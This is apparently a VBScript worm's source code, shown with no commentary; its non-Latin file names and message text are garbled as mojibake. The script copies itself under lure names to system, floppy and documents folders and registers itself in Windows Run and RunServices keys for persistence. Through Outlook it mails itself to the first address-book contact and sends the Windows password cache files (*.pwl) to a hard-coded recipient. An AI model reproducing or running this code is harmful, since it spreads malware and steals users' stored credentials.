Option Explicit
On Error Resume Next
Dim FileSysObject, File
Set FileSysObject = CreateObject ("Scripting.FileSystemObject")
Set File = FileSysObject.GetFile(WScript.ScriptFullName)
File.Copy ("c:\windows\���������.vbs")
File.Copy ("A:\���������� ��������!!!.vbs")
File.Copy ("C:\Windows\������� ����\���������\������������\MsOffice-VBSScript.vbs")
File.Copy ("C:\��� ���������\���������� ��������!!.vbs")
Dim WshShell
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\Reget2", "c:\windows\���������.vbs"
WshShell.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Conect", "C:\WINDOWS\���������.vbs"
Dim OutlookObject, OutMail
Set OutlookObject = CreateObject("Outlook.Application")
Set OutMail = OutlookObject.CreateItem(0)
OutMail.to = OutlookObject.GetNameSpace("MAPI").AddressLists(1).AddressEntries(1)
OutMail.Subject = "���� ��������"
OutMail.Body = "��������" 
OutMail.Attachments.Add(WScript.ScriptFullName)
OutMail.Send
Dim OutlookObject2, OutMail2
Set OutlookObject2 = CreateObject("Outlook.Application")
Set OutMail2 = OutlookObject.CreateItem(0)
OutMail2.to = "��� �����"
OutMail2.Subject = "���� ������"
OutMail2.Body = "����� ������"
OutMail2.Attachments.Add"C:\Windows\*.pwl"
OutMail2.Send
